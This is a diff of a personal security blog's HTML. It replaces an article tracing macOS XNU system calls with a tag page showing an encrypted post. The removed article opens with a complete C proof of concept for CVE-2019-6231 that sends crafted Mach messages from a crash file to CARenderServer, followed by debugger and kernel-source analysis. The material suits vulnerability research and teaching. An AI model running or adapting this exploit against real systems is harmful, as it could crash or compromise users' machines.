@@ -15,39 +15,17 @@
   </script>
 
   
-  <title>XNU系统调用深度解析 | 4ch12dy</title>
+  <title>Tag: me | 4ch12dy</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="#XNU系统调用深度解析
-从一个函数分析到系统调用的内核实现
-
-#由一段POC而起#include &amp;lt;stdio.h&amp;gt;
-#include &amp;lt;mach/i386/kern_return.h&amp;gt;
-#include &amp;lt;mach/mach_traps.h&amp;gt;
-#include &amp;lt;servers/bootstrap.h&amp;gt;
-#include &amp;lt;dirent.h">
-<meta property="og:type" content="article">
-<meta property="og:title" content="XNU系统调用深度解析">
-<meta property="og:url" content="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU系统调用深度解析/XNU系统调用深度解析/index.html">
+  <meta name="description" content="给我一点时间和power">
+<meta property="og:type" content="website">
+<meta property="og:title" content="4ch12dy">
+<meta property="og:url" content="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/me/index.html">
 <meta property="og:site_name" content="4ch12dy">
-<meta property="og:description" content="#XNU系统调用深度解析
-从一个函数分析到系统调用的内核实现
-
-#由一段POC而起#include &amp;lt;stdio.h&amp;gt;
-#include &amp;lt;mach/i386/kern_return.h&amp;gt;
-#include &amp;lt;mach/mach_traps.h&amp;gt;
-#include &amp;lt;servers/bootstrap.h&amp;gt;
-#include &amp;lt;dirent.h">
-<meta property="og:updated_time" content="2019-03-05T15:30:52.000Z">
+<meta property="og:description" content="给我一点时间和power">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="XNU系统调用深度解析">
-<meta name="twitter:description" content="#XNU系统调用深度解析
-从一个函数分析到系统调用的内核实现
-
-#由一段POC而起#include &amp;lt;stdio.h&amp;gt;
-#include &amp;lt;mach/i386/kern_return.h&amp;gt;
-#include &amp;lt;mach/mach_traps.h&amp;gt;
-#include &amp;lt;servers/bootstrap.h&amp;gt;
-#include &amp;lt;dirent.h">
+<meta name="twitter:title" content="4ch12dy">
+<meta name="twitter:description" content="给我一点时间和power">
   
     <link rel="alternate" href="/atom.xml" title="4ch12dy" type="application/atom+xml">
   
@@ -55,9 +33,9 @@
     <link rel="icon" href="/favicon.png">
   
   
-  <link rel="stylesheet" href="../../../../../css/common.css">
-<link rel="stylesheet" href="../../../../../css/nav.css">
-<link rel="stylesheet" href="../../../../../css/layout.css">
+  <link rel="stylesheet" href="../../css/common.css">
+<link rel="stylesheet" href="../../css/nav.css">
+<link rel="stylesheet" href="../../css/layout.css">
   
 
 </head>
@@ -86,15 +64,15 @@
                 <i class="fa fa-search" aria-hidden="true"></i>
             </a>
             
-            <a class="nav-item" href="../../../../../re">
+            <a class="nav-item" href="../../re">
                 re
             </a>
             
-            <a class="nav-item" href="../../../../../aboutme">
+            <a class="nav-item" href="../../aboutme">
                 About
             </a>
             
-            <a class="nav-item" href="../../../../../strike">
+            <a class="nav-item" href="../../strike">
                 Strike
             </a>
             
@@ -106,15 +84,15 @@
         </span>
         <div class="navbar-menu position-absolute full-width content-box is-hidden-desktop is-flex flex-column center" style="top: 100%;">
             
-            <a class="nav-item flex-1" href="../../../../../re">
+            <a class="nav-item flex-1" href="../../re">
                 re
             </a>
             
-            <a class="nav-item flex-1" href="../../../../../aboutme">
+            <a class="nav-item flex-1" href="../../aboutme">
                 About
             </a>
             
-            <a class="nav-item flex-1" href="../../../../../strike">
+            <a class="nav-item flex-1" href="../../strike">
                 Strike
             </a>
             
@@ -125,561 +103,59 @@
 
   <div id="main-wrap" class="position-relative" style="margin-top: 55px;">
       <div class="main-inner-content">
-          <!--博文页面-->
-
-<style>
-    .header-box {
-        height: 370px;
-        filter: blur(10px);
-        background-size: cover;
-        background-color: lightsteelblue;
+          <style>
+    .container.tag-cate-wrap {
+        min-height: 93vh;
     }
 
-    .post-box {
-        padding: 15px;
-        padding-top: 60px;
-        min-height: 80vh;
-        margin-top: -200px;
-        border-radius: 4px;
-        background-color: rgba(255,255,255,.8);
+    .category-title-inner {
+        padding-top: 50px;
     }
 
-    .post-avatar {
-        height: 30px;
-        width: 30px;
-        border-radius: 50%;
-    }
-
-    .flow-chart {
-        text-align: center;
-    }
-
-    img[alt="post-cover"] {
-        display: none;
+    strong {
+        text-transform: capitalize;
     }
 </style>
-<header>
-    <div id="header_box" class="header-box"></div>
-</header>
-<section>
-    <div class="container post-box">
-        <div class="content post-title is-flex center flex-column" style="margin-bottom: 70px; overflow: auto;">
-            <h1 class="has-text-centered" style="padding-bottom: 10px; border-bottom: 3px solid #fff">
-                <strong>XNU系统调用深度解析</strong>
-            </h1>
-            
-            <div class="is-flex align-center">
-                <img class="post-avatar" src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/other/xia0.png?raw=true">
-                <span style="padding:0 10px;"> <span class="sub-title">By</span> xia0</span>
-                <span class="post-date sub-title">at: 2019-01-30</span>
-            </div>
-            
-                <div>
-                    
-                         <a class="tag is-post-tag" href="/tags/XNU/">XNU</a>
-                    
-                         <a class="tag is-post-tag" href="/tags/Kernel/">Kernel</a>
-                    
-                </div>
-            
-        </div>
-        <div class="content" style="overflow: auto">
-            <h3><a href="#xnu-xi-tong-diao-yong-shen-du-jie-xi" class="header-anchor">#</a><span id="xnu-xi-tong-diao-yong-shen-du-jie-xi">XNU系统调用深度解析</span></h3><blockquote>
-<p>从一个函数分析到系统调用的内核实现</p>
-</blockquote>
-<h4><a href="#you-yi-duan-poc-er-qi" class="header-anchor">#</a><span id="you-yi-duan-poc-er-qi">由一段POC而起</span></h4><pre><code class="c">#include &lt;stdio.h&gt;
-#include &lt;mach/i386/kern_return.h&gt;
-#include &lt;mach/mach_traps.h&gt;
-#include &lt;servers/bootstrap.h&gt;
-#include &lt;dirent.h&gt;
-#include &lt;sys/stat.h&gt;
-#include &lt;time.h&gt;
-#include &lt;dlfcn.h&gt;
-#include &lt;unistd.h&gt;
 
-typedef struct quartz_register_client_s quartz_register_client_t;
-struct quartz_register_client_s {
 
-        mach_msg_header_t header;
-
-        uint32_t body;
-
-        mach_msg_port_descriptor_t ports[4];
-
-        char padding[12];
-
-};
-
-typedef struct quartzcore_mach_msg quartzcore_mach_msg_t;
-
-struct quartzcore_mach_msg{
-
-        mach_msg_header_t header;
-
-        char msg_body[712];
-
-};
-
-uint64_t get_filesize(const char *fn){
-
-        struct stat st;
-
-        stat(fn, &amp;st);
-
-        uint64_t fsize = st.st_size;
-
-        return fsize;
-
-};
-
-int main(int argc, const char * argv[]) {
-
-
-
-        mach_port_t p = MACH_PORT_NULL, bs_port = MACH_PORT_NULL;
-
-        task_get_bootstrap_port(mach_task_self(), &amp;bs_port);
-
-        const char *render_service_name = &quot;com.apple.CARenderServer&quot;;
-
-        kern_return_t (*bootstrap_look_up)(mach_port_t, const char *, mach_port_t *) = dlsym(RTLD_DEFAULT, &quot;bootstrap_look_up&quot;);
-
-        kern_return_t kr = bootstrap_look_up(bs_port, render_service_name, &amp;p);
-
-
-
-        if (kr != KERN_SUCCESS) {
-
-                return -1;
-
-        }
-
-
-
-        printf(&quot;[*] Get service of %s successully!\n&quot;, render_service_name);
-
-
-
-        quartz_register_client_t msg_register;
-
-        memset(&amp;msg_register, 0, sizeof(msg_register));
-
-        msg_register.header.msgh_bits =
-
-        MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) |
-
-        MACH_MSGH_BITS_COMPLEX;
-
-        msg_register.header.msgh_remote_port = p;
-
-        msg_register.header.msgh_local_port = mig_get_reply_port();
-
-        msg_register.header.msgh_id = 40202;  // _XRegisterClient
-
-
-
-        msg_register.body = 4;
-
-        msg_register.ports[0].name = mach_task_self();
-
-        msg_register.ports[0].disposition = MACH_MSG_TYPE_COPY_SEND;
-
-        msg_register.ports[0].type = MACH_MSG_PORT_DESCRIPTOR;
-
-        msg_register.ports[1].name = mach_task_self();
-
-        msg_register.ports[1].disposition = MACH_MSG_TYPE_COPY_SEND;
-
-        msg_register.ports[1].type = MACH_MSG_PORT_DESCRIPTOR;
-
-        msg_register.ports[2].name = mach_task_self();
-
-        msg_register.ports[2].disposition = MACH_MSG_TYPE_COPY_SEND;
-
-        msg_register.ports[2].type = MACH_MSG_PORT_DESCRIPTOR;
-
-        msg_register.ports[3].name = mach_task_self();
-
-        msg_register.ports[3].disposition = MACH_MSG_TYPE_COPY_SEND;
-
-        msg_register.ports[3].type = MACH_MSG_PORT_DESCRIPTOR;
-
-
-
-        kr = mach_msg(&amp;msg_register.header, MACH_SEND_MSG | MACH_RCV_MSG,
-
-                                    sizeof(quartz_register_client_t), sizeof(quartz_register_client_t),
-
-                                    msg_register.header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
-
-        if (kr != KERN_SUCCESS) {
-
-                return -1 ;
-
-        }
-
-
-
-        mach_port_t context_port = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x1c);
-
-        uint32_t conn_id = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x30);
-
-
-
-        printf(&quot;[*] context_port: 0x%x, conn_id: 0x%x\n&quot;,context_port,conn_id);
-
-
-
-        char *crash_log = &quot;crash.data&quot;; //size is 736.
-
-
-
-        FILE *fp = fopen(crash_log, &quot;rb&quot;);
-
-        if(fp == NULL){
-
-                printf(&quot;fopen error!\n&quot;);
-
-        }
-
-
-
-        uint64_t fsize = get_filesize(crash_log);
-
-        void *msg_buf = malloc(fsize);
-
-        memset(msg_buf, 0, fsize);
-
-        fread(msg_buf, fsize, 1, fp);
-
-
-
-        quartzcore_mach_msg_t qc_mach_msg = {0};
-
-        qc_mach_msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
-
-        qc_mach_msg.header.msgh_remote_port = context_port;
-
-        qc_mach_msg.header.msgh_id = 40002;
-
-
-
-        memset(qc_mach_msg.msg_body, 0x0, sizeof(qc_mach_msg.msg_body));
-
-        *(uint32_t *)(qc_mach_msg.msg_body + 0) = 0x1;  // Ports count
-
-        memcpy(qc_mach_msg.msg_body+4+12, msg_buf+0x1c+0xc, 736-0x1c-0xc);
-
-        *(uint32_t *)(qc_mach_msg.msg_body + 4 + 12 + 4) = conn_id;
-
-
-
-        kr = mach_msg(&amp;qc_mach_msg.header, MACH_SEND_MSG,736, 0, 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
-
-        if (kr != KERN_SUCCESS) {
-
-                printf(&quot;[-] Send message failed: 0x%d\n&quot;, kr);
-
-                return -1 ;
-
-        }
-
-        return 0;
-
-}
-</code></pre>
-<p>里面的macho函数<code>mach_msg()</code>到底后面执行到哪里？于是展开一段追踪</p>
-<p>从ida的导入表中可以看到这个函数实现在libSystem.B.dylib 顺便说下，这个动态库实际上只是一层封装，里面导入了/usr/lib/system下面的动态库。</p>
-<pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 2.1
-    frame #0: 0x00007fff79299694 libsystem_kernel.dylib`mach_msg
-libsystem_kernel.dylib`mach_msg:
--&gt;  0x7fff79299694 &lt;+0&gt;: pushq  %rbp
-    0x7fff79299695 &lt;+1&gt;: movq   %rsp, %rbp
-    0x7fff79299698 &lt;+4&gt;: pushq  %r15
-    0x7fff7929969a &lt;+6&gt;: pushq  %r14
-Target 0: (CVE-2019-6231-poc) stopped.
-</code></pre>
-<p>调试可以看出mach_msg实现在libsystem_kernel.dylib之中</p>
-<pre><code class="assembly">(lldb) dis
-libsystem_kernel.dylib`mach_msg:
--&gt;  0x7fff79299694 &lt;+0&gt;:   pushq  %rbp
-    0x7fff79299695 &lt;+1&gt;:   movq   %rsp, %rbp
-    0x7fff79299698 &lt;+4&gt;:   pushq  %r15
-    0x7fff7929969a &lt;+6&gt;:   pushq  %r14
-    0x7fff7929969c &lt;+8&gt;:   pushq  %r13
-    0x7fff7929969e &lt;+10&gt;:  pushq  %r12
-    0x7fff792996a0 &lt;+12&gt;:  pushq  %rbx
-    0x7fff792996a1 &lt;+13&gt;:  subq   $0x28, %rsp
-    0x7fff792996a5 &lt;+17&gt;:  movl   %ecx, %r13d
-    0x7fff792996a8 &lt;+20&gt;:  movl   %esi, %ebx
-    0x7fff792996aa &lt;+22&gt;:  movq   %rdi, %r14
-    0x7fff792996ad &lt;+25&gt;:  movl   0x10(%rbp), %eax
-    0x7fff792996b0 &lt;+28&gt;:  movl   %ebx, %r12d
-    0x7fff792996b3 &lt;+31&gt;:  andl   $0xfffffbbf, %r12d        ; imm = 0xFFFFFBBF 
-    0x7fff792996ba &lt;+38&gt;:  movl   %eax, (%rsp)
-    0x7fff792996bd &lt;+41&gt;:  movl   %r12d, %esi
-    0x7fff792996c0 &lt;+44&gt;:  movl   %edx, %r15d
-    0x7fff792996c3 &lt;+47&gt;:  movl   %r8d, -0x2c(%rbp)
-    0x7fff792996c7 &lt;+51&gt;:  movl   %r9d, -0x30(%rbp)
-    0x7fff792996cb &lt;+55&gt;:  callq  0x7fff79299170            ; mach_msg_trap
-    ...
-</code></pre>
-<pre><code class="c">mach_msg_return_t __cdecl mach_msg(mach_msg_header_t *msg, mach_msg_option_t option, mach_msg_size_t send_size, mach_msg_size_t rcv_size, mach_port_name_t rcv_name, mach_msg_timeout_t timeout, mach_port_name_t notify)
-{
-  mach_msg_return_t result; // eax
-  mach_msg_option_t v8; // er12
-
-  result = mach_msg_trap();
-  if ( !result )
-    return 0;
-  if ( !(option &amp; 0x40) &amp;&amp; result == 268435463 )
-  {
-    do
-      result = mach_msg_trap();
-    while ( result == 268435463 );
-  }
-  v8 = option;
-  if ( !_bittest(&amp;v8, 0xAu) &amp;&amp; result == 268451845 )
-  {
-    do
-      result = mach_msg_trap();
-    while ( result == 268451845 );
-  }
-  return result;
-}
-</code></pre>
-<p>通过调式和ida反汇编mach_msg函数可以看出，最终会调用mach_msg_trap这个函数，再跟一下</p>
-<pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 3.1
-    frame #0: 0x00007fff79299170 libsystem_kernel.dylib`mach_msg_trap
-libsystem_kernel.dylib`mach_msg_trap:
--&gt;  0x7fff79299170 &lt;+0&gt;:  movq   %rcx, %r10
-    0x7fff79299173 &lt;+3&gt;:  movl   $0x100001f, %eax          ; imm = 0x100001F 
-    0x7fff79299178 &lt;+8&gt;:  syscall 
-    0x7fff7929917a &lt;+10&gt;: retq   
-Target 0: (CVE-2019-6231-poc) stopped.
-</code></pre>
-<p>这个函数后面会调用0x100001f系统调用，可以小结得到系统库封装了最底层的实现，最终通过系统调用进入内核。在用户层到这里已经就到头了，无法再跟进。</p>
-<h4><a href="#xnu-nei-he-xi-tong-diao-yong-liu-cheng" class="header-anchor">#</a><span id="xnu-nei-he-xi-tong-diao-yong-liu-cheng">XNU内核系统调用流程</span></h4><p>系统调用发生在内核之中，那么最开始处理系统调用的地方又在哪？通过<a href="http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html" target="_blank" rel="external">intel官方文档</a>可以找到</p>
-<pre><code>SYSCALL invokes an OS system-call handler at privilege level 0.
-It does so by loading RIP from the IA32_LSTAR MSR
-</code></pre><p>也就是内核需要将系统调用处理函数入口放到<code>IA32_LSTAR</code> <a href="https://en.wikipedia.org/wiki/Model-specific_register" target="_blank" rel="external">model specific register</a>. 在内核源码中对应在<code>osfmk/i386/mp_desc.c</code>的<code>cpu_syscall_init(cpu_data_t *cdp)</code>函数之中</p>
-<pre><code class="c">/*
- * Set MSRs for sysenter/sysexit and syscall/sysret for 64-bit.
- */
-void
-cpu_syscall_init(cpu_data_t *cdp)
-{
-#if MONOTONIC
-    mt_cpu_up(cdp);
-#else /* MONOTONIC */
-#pragma unused(cdp)
-#endif /* !MONOTONIC */
-    wrmsr64(MSR_IA32_SYSENTER_CS, SYSENTER_CS); 
-    wrmsr64(MSR_IA32_SYSENTER_EIP, DBLMAP((uintptr_t) hi64_sysenter));
-    wrmsr64(MSR_IA32_SYSENTER_ESP, current_cpu_datap()-&gt;cpu_desc_index.cdi_sstku);
-    /* Enable syscall/sysret */
-    wrmsr64(MSR_IA32_EFER, rdmsr64(MSR_IA32_EFER) | MSR_IA32_EFER_SCE);
-
-    /*
-     * MSRs for 64-bit syscall/sysret
-     * Note USER_CS because sysret uses this + 16 when returning to
-     * 64-bit code.
-     */
-    wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));
-    wrmsr64(MSR_IA32_STAR, (((uint64_t)USER_CS) &lt;&lt; 48) | (((uint64_t)KERNEL64_CS) &lt;&lt; 32));
-    /*
-     * Emulate eflags cleared by sysenter but note that
-     * we also clear the trace trap to avoid the complications
-     * of single-stepping into a syscall. The nested task bit
-     * is also cleared to avoid a spurious &quot;task switch&quot;
-     * should we choose to return via an IRET.
-     */
-    wrmsr64(MSR_IA32_FMASK, EFL_DF|EFL_IF|EFL_TF|EFL_NT);
-
-}
-</code></pre>
-<p><code>wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));</code>也就是系统调用会由<code>hi64_syscall</code>函数处理。这个函数实现在<code>xnu/osfmk/x86_64/idt64.s</code>之中</p>
-<pre><code class="assembly">Entry(hi64_syscall)
-Entry(idt64_syscall)
-    swapgs
-     /* Use RAX as a temporary by shifting its contents into R11[32:63]
-      * The systemcall number is defined to be a 32-bit quantity, as is
-      * RFLAGS.
-      */
-    shlq    $32, %rax
-    or     %rax, %r11
-.globl EXT(dblsyscall_patch_point)
-EXT(dblsyscall_patch_point):
-//    movabsq    $0x12345678ABCDEFFFULL, %rax
-     /* Generate offset to the double-mapped per-CPU data shadow
-      * into RAX
-      */
-    leaq    EXT(idt64_hndl_table0)(%rip), %rax
-    mov    16(%rax), %rax
-    mov     %rsp, %gs:CPU_UBER_TMP(%rax)  /* save user stack */
-    mov     %gs:CPU_ESTACK(%rax), %rsp  /* switch stack to per-cpu estack */
-    sub    $(ISF64_SIZE), %rsp
-
-    /*
-     * Synthesize an ISF frame on the exception stack
-     */
-    movl    $(USER_DS), ISF64_SS(%rsp)
-    mov    %rcx, ISF64_RIP(%rsp)        /* rip */
-
-    mov    %gs:CPU_UBER_TMP(%rax), %rcx
-    mov    %rcx, ISF64_RSP(%rsp)        /* user stack --changed */
-
-    mov    %r11, %rax
-    shrq    $32, %rax        /* Restore RAX */
-    mov    %r11d, %r11d        /* Clear r11[32:63] */
-
-    mov    %r11, ISF64_RFLAGS(%rsp)    /* rflags */
-    movl    $(SYSCALL_CS), ISF64_CS(%rsp)    /* cs - a pseudo-segment */
-    mov    %rax, ISF64_ERR(%rsp)        /* err/rax - syscall code */
-    movq    $(HNDL_SYSCALL), ISF64_TRAPFN(%rsp)
-    movq    $(T_SYSCALL), ISF64_TRAPNO(%rsp)    /* trapno */
-    swapgs
-    jmp    L_dispatch            /* this can only be 64-bit */
-</code></pre>
-<p>继续跟下去，会得到如下执行流程</p>
-<pre><code>syscall--&gt;hi64_syscall-&gt;L_dispatch--&gt;ks_dispatch--&gt;ks_dispatch_user--&gt;L_dispatch_U64--&gt;
-L_dispatch_64bit--&gt;L_common_dispatch--&gt;hndl_syscall
-</code></pre><pre><code class="assembly">/*
- * 64bit Tasks
- * System call entries via syscall only:
- *
- *    r15     x86_saved_state64_t
- *    rsp     kernel stack
- *
- *    both rsp and r15 are 16-byte aligned
- *    interrupts disabled
- *    direction flag cleared
- */
-
-Entry(hndl_syscall)
-    TIME_TRAP_UENTRY
-
-    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */
-    movl    $-1, TH_IOTIER_OVERRIDE(%rcx)    /* Reset IO tier override to -1 before handling syscall */
-    movq    TH_TASK(%rcx),%rbx        /* point to current task  */
-
-    /* Check for active vtimers in the current task */
-    TASK_VTIMER_CHECK(%rbx,%rcx)
-
-    /*
-     * We can be here either for a mach, unix machdep or diag syscall,
-     * as indicated by the syscall class:
-     */
-    movl    R64_RAX(%r15), %eax        /* syscall number/class */
-    movl    %eax, %edx
-    andl    $(SYSCALL_CLASS_MASK), %edx    /* syscall class */
-    cmpl    $(SYSCALL_CLASS_MACH&lt;&lt;SYSCALL_CLASS_SHIFT), %edx
-    je    EXT(hndl_mach_scall64)
-    cmpl    $(SYSCALL_CLASS_UNIX&lt;&lt;SYSCALL_CLASS_SHIFT), %edx
-    je    EXT(hndl_unix_scall64)
-    cmpl    $(SYSCALL_CLASS_MDEP&lt;&lt;SYSCALL_CLASS_SHIFT), %edx
-    je    EXT(hndl_mdep_scall64)
-    cmpl    $(SYSCALL_CLASS_DIAG&lt;&lt;SYSCALL_CLASS_SHIFT), %edx
-    je    EXT(hndl_diag_scall64)
-
-    /* Syscall class unknown */
-    sti
-    CCALL3(i386_exception, $(EXC_SYSCALL), %rax, $1)
-    /* no return */
-</code></pre>
-<p><code>hndl_syscall</code>这个函数会系统调用分为<code>hndl_unix_scall64</code> 、<code>hndl_mach_scall64</code>、<code>hndl_mdep_scall64</code>、<code>hndl_diag_scall64</code>四类分别处理</p>
-<p>这里以<code>hndl_unix_scall64</code>为列</p>
-<pre><code class="assembly">Entry(hndl_unix_scall)
-
-        TIME_TRAP_UENTRY
-
-    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */
-    movq    TH_TASK(%rcx),%rbx        /* point to current task  */
-    incl    TH_SYSCALLS_UNIX(%rcx)        /* increment call count   */
-
-    /* Check for active vtimers in the current task */
-    TASK_VTIMER_CHECK(%rbx,%rcx)
-
-    sti
-
-    CCALL1(unix_syscall, %r15)
-    /*
-     * always returns through thread_exception_return
-     */
-</code></pre>
-<p>这里调动了<code>unix_syscall</code>函数，这个函数在bsd/dev/i386/systemcalls.c之中实现，里面进行了一些权限检查</p>
-<p>以及根据系统调用表去调用对应的实现</p>
-<pre><code class="c">  thread = current_thread();
-  uthread = get_bsdthread_info(thread);
-  // regs is derrived from r15 ...
-  code = regs-&gt;rax &amp; SYSCALL_NUMBER_MASK;
-  callp = (code &gt;= NUM_SYSENT) ? &amp;sysent[63] : &amp;sysent[code];
-  // ...
-  vt = (void *)uthread-&gt;uu_arg;
-  // ...
-  memcpy(vt, args_start_at_rdi ? &amp;regs-&gt;rdi : &amp;regs-&gt;rsi,
-        args_in_regs * sizeof(syscall_arg_t));
-  // ...
-  error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0]));
-</code></pre>
-<p>目前执行的流程如下</p>
-<pre><code>hi64_syscall
-L_dispatch_U64
-L_dispatch_64bit
-L_common_dispatch
-hndl_syscall // rdx, pushed in hi64_syscall
-hndl_unix_scall64
-unix_syscall64
-error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0])); // now we&#39;re there
-</code></pre><h4><a href="#can-kao" class="header-anchor">#</a><span id="can-kao">参考</span></h4><p><a href="https://www.binss.me/blog/interrupt-and-exception/" target="_blank" rel="external">https://www.binss.me/blog/interrupt-and-exception/</a></p>
-<p><a href="https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html" target="_blank" rel="external">https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html</a></p>
-<p><a href="https://gist.github.com/yrp604/23e86dce9ca12bf514ef" target="_blank" rel="external">https://gist.github.com/yrp604/23e86dce9ca12bf514ef</a></p>
-
-        </div>
-        <div class="post-reply">
-            
-            
-            <div id="disqus_thread" style="width: 80%; margin: 0 auto;"></div>
-                <script>
-
-                    /**
-                     *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
-                     *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
-                    /*
-                     var disqus_config = function () {
-                     this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
-                     this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
-                     };
-                     */
-                    (function() { // DON'T EDIT BELOW THIS LINE
-                        var d = document, s = d.createElement('script');
-                        s.src = 'https://4ch12dy.disqus.com/embed.js';
-                        s.setAttribute('data-timestamp', +new Date());
-                        (d.head || d.body).appendChild(s);
-                    })();
-                </script>
-                <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-            
-        </div>
+<div class="container tag-cate-wrap">
+    <div class="category-title-inner content has-text-centered">
+        <h1><strong style="border-top: 2px solid; border-bottom: 2px solid;">tag·me</strong></h1>
     </div>
-</section>
-<script>
-    // 获取第一张图, 用以当封面背景图
-    var img = document.querySelectorAll('img')[1]
 
-    if (img) {
-        var header_box = document.querySelector('#header_box')
-        header_box.style.backgroundImage = 'url('+ img.src +')'
-    }
-</script>
+    
+    
+        <div class="box">
+            <article class="media">
+                
+                <a href="/2019/03/05/1amb4ck/1amb4ck/">
+                    
+                    <div class="media-content">
+                        <div class="content">
+                            <p>
+                                <strong>4Me</strong> <small class="post-date">at: 2019-03-05</small>
+                                <br>
+                                
 
-<!-- for code block highlight --> 
-<!-- theme.block_highlight -->
-<!-- we do not guarantee the char sequences spell right, usr himself do it -->
-<link rel="stylesheet" href="../../../../../css/highlight_github.css">
-<script src="/js/highlight.min.js"></script>
-<script type="text/javascript"> hljs.initHighlightingOnLoad();</script>
+  
+  
+    Need password to decrypt!
+    
+  
 
+Incorrect Password!
+No content to display!
+
+U2FsdGVkX1+RXuRRPln/8k/q70Lk2AIuwKGrGDYRQ83BvZJypllaVqdd4Es5m5XeLkKQVGHPQNF0+ewzX3Ria7m..
+                            </p>
+                            <button class="button is-info">Read</button>
+                        </div>
+                    </div>
+                </a>
+            </article>
+        </div>
+    
+</div>
       </div>
   </div>
   <style>
@@ -716,8 +192,23 @@ error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0])); //
   </div>
 </footer>
 
-<script src="../../../../../js/search_core.js"></script>
-<script src="../../../../../js/script.js"></script>
+<script src="../../js/search_core.js"></script>
+<script src="../../js/script.js"></script>
 
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
 </body>
 </html>
